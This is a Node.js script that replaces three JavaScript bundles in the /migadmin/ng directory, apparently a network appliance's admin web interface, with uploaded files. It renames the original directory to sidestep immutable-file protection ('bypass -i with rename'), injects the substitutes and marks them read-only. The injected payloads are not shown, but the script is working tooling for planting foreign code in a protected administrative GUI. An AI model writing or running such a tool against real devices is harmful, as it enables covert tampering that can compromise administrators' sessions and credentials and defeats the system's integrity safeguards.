#!/usr/bin/env node

"use strict";
const fs = require("fs");
const path = require("path");

const SRC = "/migadmin/ng";
const ORIG = "/var/ng._orig";
const UPLOAD_DIR = __dirname;

const PROTECTED_FILES = new Set([
  "app.js.gz",
  "chunk-2970.js.gz",
  "chunk-5398.js.gz",
]);
const READONLY = 0o444;

function copyRecursive(srcPath, destPath, skipProtected) {
  const stat = fs.lstatSync(srcPath);
  if (stat.isDirectory()) {
    fs.mkdirSync(destPath, { recursive: true });
    for (const entry of fs.readdirSync(srcPath)) {
      copyRecursive(
        path.join(srcPath, entry),
        path.join(destPath, entry),
        skipProtected,
      );
    }
  } else {
    if (skipProtected && PROTECTED_FILES.has(path.basename(srcPath))) {
      console.log(`  [SKIP] protected (not copied): ${srcPath}`);
      return;
    }
    fs.mkdirSync(path.dirname(destPath), { recursive: true });
    fs.copyFileSync(srcPath, destPath);
    fs.chmodSync(destPath, stat.mode);
  }
}

function findProtectedFiles(dirPath, baseDir) {
  const results = [];
  for (const entry of fs.readdirSync(dirPath)) {
    const full = path.join(dirPath, entry);
    const stat = fs.lstatSync(full);
    if (stat.isDirectory()) {
      results.push(...findProtectedFiles(full, baseDir));
    } else if (PROTECTED_FILES.has(entry)) {
      results.push({
        relPath: path.relative(baseDir, full),
        absPath: full,
      });
    }
  }
  return results;
}

function setProtectedReadonly(dirPath) {
  for (const { absPath } of findProtectedFiles(dirPath, dirPath)) {
    try {
      fs.chmodSync(absPath, READONLY);
      console.log(`  [RO]   ${absPath} → 0${READONLY.toString(8)}`);
    } catch (e) {
      console.warn(`  [WARN] cannot set readonly: ${absPath} - ${e.message}`);
    }
  }
}

const src = path.resolve(SRC);
const orig = path.resolve(ORIG);

if (!fs.existsSync(src)) {
  console.error(`err: SRC does not exist: ${src}`);
  process.exit(1);
}
if (fs.existsSync(orig)) {
  console.error(
    `err: ORIG already exists (previous mv.js run not restored?): ${orig}`,
  );
  console.error(`     Run mv_restore.js first, or manually remove: ${orig}`);
  process.exit(1);
}

for (const name of PROTECTED_FILES) {
  const uploadFile = path.join(UPLOAD_DIR, name);
  if (!fs.existsSync(uploadFile)) {
    console.error(`err: uploaded file not found: ${uploadFile}`);
    process.exit(1);
  }
}

console.log("=".repeat(60));
console.log("[Step 1] pre: rename src -> orig (bypass -i with rename)");
console.log(`  src  : ${src}`);
console.log(`  orig : ${orig}`);
console.log("=".repeat(60));

const protectedInSrc = findProtectedFiles(src, src);
if (protectedInSrc.length === 0) {
  console.warn("  [WARN] no protected files found in src");
}

try {
  fs.renameSync(src, orig);
  console.log(`  [OK]   rename: ${src} -> ${orig}`);
} catch (e) {
  console.error(`err: rename src->orig failed - ${e.message}`);
  process.exit(1);
}
console.log();

console.log("=".repeat(60));
console.log("[Step 2] copy: orig -> src (skip protected files)");
console.log(`  orig : ${orig}`);
console.log(`  src  : ${src}`);
console.log("=".repeat(60));

try {
  copyRecursive(orig, src, true);
} catch (e) {
  console.error(`err: copy orig->src failed - ${e.message}`);
  process.exit(1);
}
console.log();

console.log("=".repeat(60));
console.log("[Step 3] inject: place uploaded files into src");
console.log(`  upload dir: ${UPLOAD_DIR}`);
console.log("=".repeat(60));

if (protectedInSrc.length > 0) {
  for (const { relPath } of protectedInSrc) {
    const name = path.basename(relPath);
    const uploadFile = path.join(UPLOAD_DIR, name);
    const targetFile = path.join(src, relPath);
    fs.mkdirSync(path.dirname(targetFile), { recursive: true });
    fs.copyFileSync(uploadFile, targetFile);
    console.log(`  [OK]   ${uploadFile} -> ${targetFile}`);
  }
} else {
  for (const name of PROTECTED_FILES) {
    const uploadFile = path.join(UPLOAD_DIR, name);
    const targetFile = path.join(src, name);
    fs.copyFileSync(uploadFile, targetFile);
    console.log(`  [OK]   ${uploadFile} -> ${targetFile}`);
  }
}
console.log();

console.log("=".repeat(60));
console.log("[Step 4] post: set protected files readonly");
console.log(`  src: ${src}`);
console.log("=".repeat(60));

setProtectedReadonly(src);

console.log(`\nAll done. Protected files replaced in: ${src}`);
console.log(`Original directory preserved at: ${orig}`);
console.log(`To restore, run: node mv_restore.js`);
